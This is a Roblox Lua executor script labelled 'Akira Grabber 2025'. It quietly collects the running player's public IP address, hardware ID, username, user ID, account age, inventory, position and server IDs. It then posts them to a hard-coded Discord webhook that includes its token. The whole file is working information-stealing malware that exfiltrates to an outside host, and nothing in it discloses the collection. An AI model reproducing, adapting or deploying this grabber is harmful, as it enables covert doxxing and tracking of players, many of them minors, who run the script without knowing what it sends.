local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local webhook = "https://discord.com/api/webhooks/1390380945848402020/LESfqH7r0uo4FgyOMMz6VIipkXkVK46_uZ89lq7pI24U6wD4qAUKiVOh0hYWK1NoEKPG"

local IP = "Unknown"
if syn and syn.request then
    IP = syn.request({Url = "https://api.ipify.org", Method = "GET"}).Body or "N/A"
elseif http and http.request then
    IP = http.request({Url = "https://api.ipify.org", Method = "GET"}).Body or "N/A"
elseif http_request then
    IP = http_request({Url = "https://api.ipify.org", Method = "GET"}).Body or "N/A"
end

local HWID = "Unknown"
if syn and syn.gethwid then
    HWID = syn.gethwid()
end

-- Device check
local deviceType = "Unknown"
pcall(function()
    local UserInputService = game:GetService("UserInputService")
    if UserInputService.TouchEnabled then
        deviceType = "Mobile"
    elseif UserInputService.KeyboardEnabled then
        deviceType = "PC"
    end
end)

-- Backpack
local tools = {}
for _, t in pairs(LocalPlayer.Backpack:GetChildren()) do
    table.insert(tools, t.Name)
end

-- Equipamentos
local equipped = {}
local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
for _, item in pairs(char:GetChildren()) do
    if item:IsA("Tool") then
        table.insert(equipped, item.Name)
    end
end

-- Humanoid info
local hum = char:FindFirstChildOfClass("Humanoid")
local hp = hum and hum.Health or "N/A"

-- Posição
local pos = "Unknown"
local hrp = char:FindFirstChild("HumanoidRootPart")
if hrp then
    pos = tostring(hrp.Position)
end

-- Ping e FPS
local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
local fps = math.floor(1 / RunService.RenderStepped:Wait())

-- Final embed
local data = {
    ["username"] = "Akira Grabber 2025",
    ["embeds"] = {{
        ["title"] = "🚨 Executor Executado",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "UserId", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
            {["name"] = "AccountAge", ["value"] = tostring(LocalPlayer.AccountAge).." days", ["inline"] = true},
            {["name"] = "IP", ["value"] = IP, ["inline"] = false},
            {["name"] = "HWID", ["value"] = HWID, ["inline"] = false},
            {["name"] = "Team", ["value"] = tostring(LocalPlayer.Team and LocalPlayer.Team.Name or "None"), ["inline"] = true},
            {["name"] = "Device", ["value"] = deviceType, ["inline"] = true},
            {["name"] = "Ping", ["value"] = tostring(ping), ["inline"] = true},
            {["name"] = "FPS", ["value"] = tostring(fps), ["inline"] = true},
            {["name"] = "Tools", ["value"] = #tools > 0 and table.concat(tools, ", ") or "None", ["inline"] = false},
            {["name"] = "Equipped", ["value"] = #equipped > 0 and table.concat(equipped, ", ") or "None", ["inline"] = false},
            {["name"] = "Position", ["value"] = pos, ["inline"] = false},
            {["name"] = "JobId", ["value"] = game.JobId, ["inline"] = false},
            {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
        },
        ["footer"] = {["text"] = "✅ Akira Executor Grabber 2025"}
    }}
}

local json = HttpService:JSONEncode(data)

if syn and syn.request then
    syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
elseif http and http.request then
    http.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
elseif http_request then
    http_request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
end
